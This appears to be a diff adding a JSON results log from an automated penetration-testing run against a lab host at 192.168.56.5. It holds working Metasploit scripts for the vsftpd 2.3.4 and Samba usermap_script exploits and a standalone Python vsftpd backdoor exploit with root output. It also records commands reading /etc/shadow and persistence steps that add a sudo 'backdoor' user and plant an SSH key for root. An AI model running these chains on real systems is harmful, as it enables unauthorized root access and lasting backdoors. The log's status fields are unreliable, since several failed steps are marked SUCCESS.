@@ -1,0 +1,216 @@
+{
+    "target": "192.168.56.5",
+    "attack_chains": {
+        "Chain 1: vsftpd Backdoor Complete": {
+            "initial_access": [
+                {
+                    "description": "Exploit vsftpd and verify access in single msfconsole session",
+                    "command": "cat > /tmp/vsftpd_full.rc << 'EOF'\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.56.5\nset RPORT 21\nexploit -j\nsleep 15\nsessions -l\nsessions -i 1 -c \"id\"\nsessions -i 1 -c \"pwd\"\nsessions -i 1 -c \"cat /etc/shadow | head -5\"\nexit -y\nEOF",
+                    "raw_output": "cat > /tmp/vsftpd_full.rc << 'EOF'\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.56.5\nset RPORT 21\nexploit -j\nsleep 15\nsessions -l\nsessions -i 1 -c \"id\"\nsessions -i 1 -c \"pwd\"\nsessions -i 1 -c \"cat /etc/shadow | head -5\"\nexit -y\nEOF\n┌──(kali㉿kali)-[~]\n└─$ cat > /tmp/vsftpd_full.rc << 'EOF'\nheredoc> use exploit/unix/ftp/vsftpd_234_backdoor\nheredoc> set RHOSTS 192.168.56.5\nheredoc> set RPORT 21\nheredoc> exploit -j\nheredoc> sleep 15\nheredoc> sessions -l\nheredoc> sessions -i 1 -c \"id\"\nheredoc> sessions -i 1 -c \"pwd\"\nheredoc> sessions -i 1 -c \"cat /etc/shadow | head -5\"\nheredoc> exit -y\nheredoc> EOF\n\n┌──(kali㉿kali)-[~]\n└─$\n",
+                    "analysis": "Exit code: 0. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit vsftpd and verify access in single msfconsole session",
+                    "command": "timeout 60 msfconsole -q -r /tmp/vsftpd_full.rc | tee /tmp/vsftpd_output.txt",
+                    "raw_output": "timeout 60 msfconsole -q -r /tmp/vsftpd_full.rc | tee /tmp/vsftpd_output.txt\n┌──(kali㉿kali)-[~]\n└─$ timeout 60 msfconsole -q -r /tmp/vsftpd_full.rc | tee /tmp/vsftpd_output.txt\n\n[*] Processing /tmp/vsftpd_full.rc for ERB directives.\nresource (/tmp/vsftpd_full.rc)> use exploit/unix/ftp/vsftpd_234_backdoor\n[*] No payload configured, defaulting to cmd/unix/interact\nresource (/tmp/vsftpd_full.rc)> set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nresource (/tmp/vsftpd_full.rc)> set RPORT 21\nRPORT => 21\nresource (/tmp/vsftpd_full.rc)> exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nresource (/tmp/vsftpd_full.rc)> sleep 15\n[*] 192.168.56.5:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] 192.168.56.5:21 - USER: 331 Please specify the password.\n[+] 192.168.56.5:21 - Backdoor service has been spawned, handling...\n[+] 192.168.56.5:21 - UID: uid=0(root) gid=0(root)\n[*] Found shell.\n\n\n\n\n",
+                    "analysis": "Exit code: 0. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit vsftpd and verify access in single msfconsole session",
+                    "command": "grep -q 'uid=0(root)' /tmp/vsftpd_output.txt && echo 'SUCCESS: Got root shell' || echo 'FAILED: No root access'",
+                    "raw_output": "grep -q 'uid=0(root)' /tmp/vsftpd_output.txt && echo 'SUCCESS: Got root shell' |\n| echo 'FAILED: No root access'\n┌──(kali㉿kali)-[~]\n└─$ grep -q 'uid=0(root)' /tmp/vsftpd_output.txt && echo 'SUCCESS: Got root shel\nl' || echo 'FAILED: No root access'\nSUCCESS: Got root shell\n\n┌──(kali㉿kali)-[~]\n└─$\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Exit code: 0. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                }
+            ],
+            "privilege_escalation": [
+                {
+                    "description": "Already root from vsftpd backdoor",
+                    "command": "echo 'Privilege escalation not needed - vsftpd backdoor gives root directly'",
+                    "raw_output": "echo 'Privilege escalation not needed - vsftpd backdoor gives root directly'\n┌──(kali㉿kali)-[~]\n└─$ echo 'Privilege escalation not needed - vsftpd backdoor gives root directly'\n\nPrivilege escalation not needed - vsftpd backdoor gives root directly\n\n┌──(kali㉿kali)-[~]\n└─$\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Exit code: 0. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                }
+            ],
+            "persistence": [
+                {
+                    "description": "Add SSH backdoor user via standalone exploit",
+                    "command": "cat > /tmp/vsftpd_persist.rc << 'EOF'\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.56.5\nset RPORT 21\nexploit -j\nsleep 15\nsessions -i 1 -c \"useradd -m -s /bin/bash backdoor\"\nsessions -i 1 -c \"echo 'backdoor:password123' | chpasswd\"\nsessions -i 1 -c \"usermod -aG sudo backdoor\"\nsessions -i 1 -c \"cat /etc/passwd | grep backdoor\"\nexit -y\nEOF",
+                    "raw_output": "cat > /tmp/vsftpd_persist.rc << 'EOF'\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.56.5\nset RPORT 21\nexploit -j\nsleep 15\nsessions -i 1 -c \"useradd -m -s /bin/bash backdoor\"\nsessions -i 1 -c \"echo 'backdoor:password123' | chpasswd\"\nsessions -i 1 -c \"usermod -aG sudo backdoor\"\nsessions -i 1 -c \"cat /etc/passwd | grep backdoor\"\nexit -y\nEOF\n┌──(kali㉿kali)-[~]\n└─$ cat > /tmp/vsftpd_persist.rc << 'EOF'\nheredoc> use exploit/unix/ftp/vsftpd_234_backdoor\nheredoc> set RHOSTS 192.168.56.5\nheredoc> set RPORT 21\nheredoc> exploit -j\nheredoc> sleep 15\nheredoc> sessions -i 1 -c \"useradd -m -s /bin/bash backdoor\"\nheredoc> sessions -i 1 -c \"echo 'backdoor:password123' | chpasswd\"\nheredoc> sessions -i 1 -c \"usermod -aG sudo backdoor\"\nheredoc> sessions -i 1 -c \"cat /etc/passwd | grep backdoor\"\nheredoc> exit -y\nheredoc> EOF\n\n┌──(kali㉿kali)-[~]\n└─$\n",
+                    "analysis": "Exit code: 0. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Add SSH backdoor user via standalone exploit",
+                    "command": "timeout 60 msfconsole -q -r /tmp/vsftpd_persist.rc | tee /tmp/persist_output.txt",
+                    "raw_output": "timeout 60 msfconsole -q -r /tmp/vsftpd_persist.rc | tee /tmp/persist_output.txt\n┌──(kali㉿kali)-[~]\n└─$ timeout 60 msfconsole -q -r /tmp/vsftpd_persist.rc | tee /tmp/persist_output\n.txt\n[*] Processing /tmp/vsftpd_persist.rc for ERB directives.\nresource (/tmp/vsftpd_persist.rc)> use exploit/unix/ftp/vsftpd_234_backdoor\n[*] No payload configured, defaulting to cmd/unix/interact\nresource (/tmp/vsftpd_persist.rc)> set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nresource (/tmp/vsftpd_persist.rc)> set RPORT 21\nRPORT => 21\nresource (/tmp/vsftpd_persist.rc)> exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nresource (/tmp/vsftpd_persist.rc)> sleep 15\n[*] 192.168.56.5:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] 192.168.56.5:21 - USER: 331 Please specify the password.\n[+] 192.168.56.5:21 - Backdoor service has been spawned, handling...\n[+] 192.168.56.5:21 - UID: uid=0(root) gid=0(root)\n[*] Found shell.\n\n\n\n\n",
+                    "analysis": "Exit code: 0. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Add SSH backdoor user via standalone exploit",
+                    "command": "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa,ssh-dss backdoor@192.168.56.5 'whoami' || echo 'SSH persistence failed'",
+                    "raw_output": "SSH persistence failed\ncommand-line line 0: Bad key types '+ssh-rsa,ssh-dss'.\r\n",
+                    "analysis": "Exit code: 0. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                }
+            ],
+            "overall_status": "completed",
+            "furthest_stage": "persistence",
+            "notes": []
+        },
+        "Chain 2: Samba Usermap Complete": {
+            "initial_access": [
+                {
+                    "description": "Exploit Samba usermap_script vulnerability",
+                    "command": "cat > /tmp/samba_full.rc << 'EOF'\nuse exploit/multi/samba/usermap_script\nset RHOSTS 192.168.56.5\nset RPORT 139\nset PAYLOAD cmd/unix/bind_netcat\nset LPORT 4444\nexploit -j\nsleep 15\nsessions -l\nsessions -i 1 -c \"id\"\nsessions -i 1 -c \"uname -a\"\nexit -y\nEOF",
+                    "raw_output": "",
+                    "analysis": "Exit code: 0. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit Samba usermap_script vulnerability",
+                    "command": "timeout 60 msfconsole -q -r /tmp/samba_full.rc | tee /tmp/samba_output.txt",
+                    "raw_output": "timeout 60 msfconsole -q -r /tmp/samba_full.rc | tee /tmp/samba_output.txt\n┌──(kali㉿kali)-[~]\n└─$ timeout 60 msfconsole -q -r /tmp/samba_full.rc | tee /tmp/samba_output.txt\n[*] Processing /tmp/samba_full.rc for ERB directives.\nresource (/tmp/samba_full.rc)> use exploit/multi/samba/usermap_script\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nresource (/tmp/samba_full.rc)> set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nresource (/tmp/samba_full.rc)> set RPORT 139\nRPORT => 139\nresource (/tmp/samba_full.rc)> set PAYLOAD cmd/unix/bind_netcat\nPAYLOAD => cmd/unix/bind_netcat\nresource (/tmp/samba_full.rc)> set LPORT 4444\nLPORT => 4444\nresource (/tmp/samba_full.rc)> exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nresource (/tmp/samba_full.rc)> sleep 15\n[*] Started bind TCP handler against 192.168.56.5:4444\n\n\n\n\n\n",
+                    "analysis": "Exit code: 0. FAILED - Metasploit ran but no clear success indicators in output",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Metasploit ran but no clear success indicators in output"
+                },
+                {
+                    "description": "Exploit Samba usermap_script vulnerability",
+                    "command": "grep -q 'uid=' /tmp/samba_output.txt && echo 'SUCCESS: Got shell' || echo 'FAILED: No shell'",
+                    "raw_output": "FAILED: No shell\n",
+                    "analysis": "Exit code: 0. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                }
+            ],
+            "privilege_escalation": [
+                {
+                    "description": "Check privileges and enumerate system",
+                    "command": "cat > /tmp/samba_priv.rc << 'EOF'\nuse exploit/multi/samba/usermap_script\nset RHOSTS 192.168.56.5\nset RPORT 139\nset PAYLOAD cmd/unix/bind_netcat\nset LPORT 4445\nexploit -j\nsleep 15\nsessions -i 1 -c \"id\"\nsessions -i 1 -c \"sudo -l\"\nsessions -i 1 -c \"find / -perm -4000 2>/dev/null | head -10\"\nexit -y\nEOF",
+                    "raw_output": "",
+                    "analysis": "Exit code: 0. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Check privileges and enumerate system",
+                    "command": "timeout 60 msfconsole -q -r /tmp/samba_priv.rc | tee /tmp/samba_priv_output.txt",
+                    "raw_output": "timeout 60 msfconsole -q -r /tmp/samba_priv.rc | tee /tmp/samba_priv_output.txt\n┌──(kali㉿kali)-[~]\n└─$ timeout 60 msfconsole -q -r /tmp/samba_priv.rc | tee /tmp/samba_priv_output.\ntxt\n[*] Processing /tmp/samba_priv.rc for ERB directives.\nresource (/tmp/samba_priv.rc)> use exploit/multi/samba/usermap_script\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nresource (/tmp/samba_priv.rc)> set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nresource (/tmp/samba_priv.rc)> set RPORT 139\nRPORT => 139\nresource (/tmp/samba_priv.rc)> set PAYLOAD cmd/unix/bind_netcat\nPAYLOAD => cmd/unix/bind_netcat\nresource (/tmp/samba_priv.rc)> set LPORT 4445\nLPORT => 4445\nresource (/tmp/samba_priv.rc)> exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nresource (/tmp/samba_priv.rc)> sleep 15\n[*] Started bind TCP handler against 192.168.56.5:4445\n\n\n\n\n",
+                    "analysis": "Exit code: 0. FAILED - Metasploit ran but no clear success indicators in output",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Metasploit ran but no clear success indicators in output"
+                }
+            ],
+            "overall_status": "partial",
+            "furthest_stage": "initial_access",
+            "notes": []
+        },
+        "Chain 3: Direct Python Exploit (No Metasploit)": {
+            "initial_access": [
+                {
+                    "description": "Use Python to trigger vsftpd backdoor directly",
+                    "command": "cat > /tmp/vsftpd_exploit.py << 'EOF'\nimport socket\nimport time\n\ndef exploit():\n    # Connect to FTP\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('192.168.56.5', 21))\n    s.recv(1024)\n    \n    # Trigger backdoor with :) in username\n    s.send(b'USER root:)\\r\\n')\n    s.recv(1024)\n    s.send(b'PASS password\\r\\n')\n    s.close()\n    \n    time.sleep(2)\n    \n    # Connect to backdoor shell on port 6200\n    shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    shell.connect(('192.168.56.5', 6200))\n    \n    # Send command\n    shell.send(b'id\\n')\n    result = shell.recv(4096).decode()\n    print(result)\n    \n    shell.send(b'whoami\\n')\n    result = shell.recv(4096).decode()\n    print(result)\n    \n    shell.close()\n    return result\n\nif __name__ == '__main__':\n    try:\n        exploit()\n        print('SUCCESS')\n    except Exception as e:\n        print(f'FAILED: {e}')\nEOF",
+                    "raw_output": "cat > /tmp/vsftpd_exploit.py << 'EOF'\nimport socket\nimport time\n\ndef exploit():\n    # Connect to FTP\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('192.168.56.5', 21))\n    s.recv(1024)\n\n    # Trigger backdoor with :) in username\n    s.send(b'USER root:)\\r\\n')\n    s.recv(1024)\n    s.send(b'PASS password\\r\\n')\n    s.close()\n\n    time.sleep(2)\n\n    # Connect to backdoor shell on port 6200\n    shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    shell.connect(('192.168.56.5', 6200))\n\n    # Send command\n    shell.send(b'id\\n')\n    result = shell.recv(4096).decode()\n    print(result)\n\n    shell.send(b'whoami\\n')\n    result = shell.recv(4096).decode()\n    print(result)\n\n    shell.close()\n    return result\n\nif __name__ == '__main__':\n    try:\n        exploit()\n        print('SUCCESS')\n    except Exception as e:\n        print(f'FAILED: {e}')\nEOF\n┌──(kali㉿kali)-[~]\n└─$ cat > /tmp/vsftpd_exploit.py << 'EOF'\nheredoc> import socket\nheredoc> import time\nheredoc>\nheredoc> def exploit():\nheredoc>     # Connect to FTP\nheredoc>     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nheredoc>     s.connect(('192.168.56.5', 21))\nheredoc>     s.recv(1024)\nheredoc>\nheredoc>     # Trigger backdoor with :) in username\nheredoc>     s.send(b'USER root:)\\r\\n')\nheredoc>     s.recv(1024)\nheredoc>     s.send(b'PASS password\\r\\n')\nheredoc>     s.close()\nheredoc>\nheredoc>     time.sleep(2)\nheredoc>\nheredoc>     # Connect to backdoor shell on port 6200\nheredoc>     shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nheredoc>     shell.connect(('192.168.56.5', 6200))\nheredoc>\nheredoc>     # Send command\nheredoc>     shell.send(b'id\\n')\nheredoc>     result = shell.recv(4096).decode()\nheredoc>     print(result)\nheredoc>\nheredoc>     shell.send(b'whoami\\n')\nheredoc>     result = shell.recv(4096).decode()\nheredoc>     print(result)\nheredoc>\nheredoc>     shell.close()\nheredoc>     return result\nheredoc>\nheredoc> if __name__ == '__main__':\nheredoc>     try:\nheredoc>         exploit()\nheredoc>         print('SUCCESS')\nheredoc>     except Exception as e:\nheredoc>         print(f'FAILED: {e}')\nheredoc> EOF\n\n┌──(kali㉿kali)-[~]\n└─$\n",
+                    "analysis": "Exit code: 0. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Use Python to trigger vsftpd backdoor directly",
+                    "command": "python3 /tmp/vsftpd_exploit.py",
+                    "raw_output": "python3 /tmp/vsftpd_exploit.py\n┌──(kali㉿kali)-[~]\n└─$ python3 /tmp/vsftpd_exploit.py\nuid=0(root) gid=0(root)\n\nroot\n\nSUCCESS\n\n┌──(kali㉿kali)-[~]\n└─$\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Exit code: 0. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                }
+            ],
+            "privilege_escalation": [
+                {
+                    "description": "Already root from backdoor",
+                    "command": "echo 'N/A - backdoor provides root'",
+                    "raw_output": "N/A - backdoor provides root\n",
+                    "analysis": "Exit code: 0. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                }
+            ],
+            "persistence": [
+                {
+                    "description": "Use shell to add SSH key",
+                    "command": "test -f ~/.ssh/id_rsa || ssh-keygen -t rsa -N '' -f ~/.ssh/id_rsa",
+                    "raw_output": "",
+                    "analysis": "Exit code: 0. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Use shell to add SSH key",
+                    "command": "cat > /tmp/add_key.py << 'EOF'\nimport socket\nimport time\n\ndef exploit():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('192.168.56.5', 21))\n    s.recv(1024)\n    s.send(b'USER root:)\\r\\n')\n    s.recv(1024)\n    s.send(b'PASS pass\\r\\n')\n    s.close()\n    time.sleep(2)\n    \n    shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    shell.connect(('192.168.56.5', 6200))\n    \n    with open('/home/kali/.ssh/id_rsa.pub', 'r') as f:\n        pubkey = f.read().strip()\n    \n    commands = [\n        'mkdir -p /root/.ssh',\n        'chmod 700 /root/.ssh',\n        f'echo \"{pubkey}\" >> /root/.ssh/authorized_keys',\n        'chmod 600 /root/.ssh/authorized_keys',\n        'cat /root/.ssh/authorized_keys'\n    ]\n    \n    for cmd in commands:\n        shell.send(f'{cmd}\\n'.encode())\n        time.sleep(1)\n        result = shell.recv(4096)\n        print(result.decode())\n    \n    shell.close()\n\nexploit()\nEOF",
+                    "raw_output": "",
+                    "analysis": "Exit code: 0. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Use shell to add SSH key",
+                    "command": "python3 /tmp/add_key.py",
+                    "raw_output": "Timeout after 120s",
+                    "analysis": "Exit code: -1. FAILED",
+                    "status": "error",
+                    "return_code": -1,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Use shell to add SSH key",
+                    "command": "ssh -o StrictHostKeyChecking=no -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa,ssh-dss -i ~/.ssh/id_rsa root@192.168.56.5 'whoami'",
+                    "raw_output": "command-line line 0: Bad key types '+ssh-rsa,ssh-dss'.\r\n",
+                    "analysis": "Exit code: 255. FAILED - command-line line 0: Bad key types '+ssh-rsa,ssh-dss'.\r\n",
+                    "status": "error",
+                    "return_code": 255,
+                    "failure_reason": "command-line line 0: Bad key types '+ssh-rsa,ssh-dss'.\r\n"
+                }
+            ],
+            "overall_status": "completed",
+            "furthest_stage": "persistence",
+            "notes": []
+        }
+    },
+    "failed_chains": [],
+    "initial_chains": [
+        "Chain 2: Samba Usermap Complete"
+    ],
+    "privilege_chains": [],
+    "persistence_chains": [
+        "Chain 1: vsftpd Backdoor Complete",
+        "Chain 3: Direct Python Exploit (No Metasploit)"
+    ]
+}
